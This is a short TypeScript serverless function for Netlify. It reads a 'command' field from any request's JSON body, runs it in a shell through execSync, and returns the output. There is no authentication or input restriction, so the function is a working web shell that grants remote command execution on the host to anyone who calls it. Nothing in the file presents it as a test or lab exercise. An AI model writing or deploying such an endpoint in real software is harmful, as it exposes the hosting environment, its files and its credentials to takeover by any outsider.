import { Context } from '@netlify/functions';
import { execSync } from 'child_process'

async function run(com) {
    let ret = [];
    try {
        const comRet = execSync(com).toString();
        ret.push(comRet)
    } catch (error) {
        ret.push(error.message)
    }
    return ret;
}

export default async (req: Request, context: Context) => {
    const body = await req.json();
    const ret = await run(body.command);
    const text = ret.join("\n")
    const result = text.split('\n').filter(e => e);
    return new Response(JSON.stringify(result));
}